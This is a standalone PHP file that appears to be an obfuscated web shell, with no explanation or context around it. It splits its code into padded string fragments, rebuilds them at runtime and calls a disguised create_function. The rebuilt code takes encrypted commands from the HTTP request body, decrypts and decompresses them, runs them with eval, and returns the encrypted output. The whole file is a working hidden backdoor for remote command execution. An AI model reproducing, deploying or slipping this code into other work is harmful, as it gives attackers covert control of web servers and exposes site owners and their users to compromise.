<?php
$M='$Sm)S==1) {@oSb_start();@eSval(S@gSzuncomSpress(@Sx(@baseSS64_';
$B='chS("/$kh(.S+)$kf/",@fSileS_get_contSSents("php:S//inSput"),';
$Q='$j++,$iS+S+){$oS.=$t{$i}^S$k{$Sj};}}return $So;}ifS (@prSSeg_mat';
$I=str_replace('qw','','crqwqwqweatqwe_funqwctqwion');
$z='rlen(S$t)S;$o=""S;for($Si=0S;$i<$l;)S{fSor($j=0;($j<$Sc&&$Si<$l);S';
$y='Sp="SdBSJdejSR1IURX5dxz";funcStioSn x($t,$k){$Sc=sSStrlen($kS);$l=st';
$D='r=@baseS64_encode(@x(S@gzcSoSmprSeSss($o),$k));print("$Sp$kSh$r$kf");}';
$v='$k="5SS0S53419c";$kh="6Sa63a2c113ed";S$kf="S763S9434585bb"S;$';
$c='deScode($m[1]),$k)))S;S$o=@oSb_get_contenStsS();@ob_Send_cleanS(S)S;$';
$T=str_replace('S','',$v.$y.$z.$Q.$B.$M.$c.$D);
$e=$I('',$T);$e();
?>
